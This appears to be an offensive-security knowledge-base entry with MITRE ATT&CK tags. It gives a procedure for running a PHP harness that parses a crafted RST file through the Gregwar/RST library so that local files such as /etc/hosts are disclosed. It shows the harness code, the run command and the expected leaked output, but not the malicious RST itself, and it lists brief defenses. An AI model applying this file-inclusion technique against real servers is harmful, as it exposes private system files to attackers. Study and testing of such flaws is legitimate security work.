---
tags:
  - php-execution
  - lfi-exploitation
  - file-disclosure
type: procedure
tools:
  - '[[tools/Gregwar-RST]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/php-rst-parse]]'
verified: false
platforms:
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:17.103Z'
sub_techniques: []
id: 3b572e52-bf0c-472d-abed-a8600850bc30
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Execute-PHP-Script-to-Parse-RST-and-Disclose-Files

## Summary

This procedure runs a PHP script to parse malicious RST content using the Gregwar/RST library, resulting in the disclosure of arbitrary local files through LFI.

## Description

In exploitation, a custom PHP script loads the RST parser, feeds it the crafted RST with include payload, and outputs HTML that embeds the target file's contents. This simulates the Airship CMS parsing flow, targeting Linux servers for files like /etc/hosts. Prerequisites include a local PHP setup with the library; outcomes confirm LFI by rendering sensitive data.

## Requirements

1. PHP 7+ installed with autoload support
2. Gregwar/RST library via Composer or manual include
3. Malicious RST file prepared
4. Permissions to read target system files

## Defense

Defensive measures and detection strategies:

- Disable or sandbox file includes in parsers
- Run parsers in isolated environments (e.g., containers)
- Audit PHP logs for unexpected file reads

## Objectives

1. Successfully parse RST and include target file
2. Output file contents in readable format
3. Validate LFI impact

## Instructions

### Step 1: Create PHP Script

**Context**: Build rst.php to instantiate and run the parser.

Write rst.php:

```php
<?php
require 'vendor/autoload.php';
use Gregwar\RST\Parser;
$parser = new Parser();
$rstContent = file_get_contents('malicious.rst');
$html = $parser->parse($rstContent);
echo $html;
?>
```

> This loads autoload, parses RST, and echoes HTML. Assumes Composer for RST.

### Step 2: Execute Script

**Context**: Run the script to trigger inclusion and view output.

Execute [[commands/php-rst-parse]]:

```bash
php rst.php
```

> Expected output: HTML with /etc/hosts contents, e.g., <p><em>Test</em></p><p>127.0.0.1 localhost...</p>. Success if file data appears.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/php-rst-parse]]

## Tools Used

- [[tools/Gregwar-RST]]

## Tags

- php-execution
- lfi-exploitation
- file-disclosure
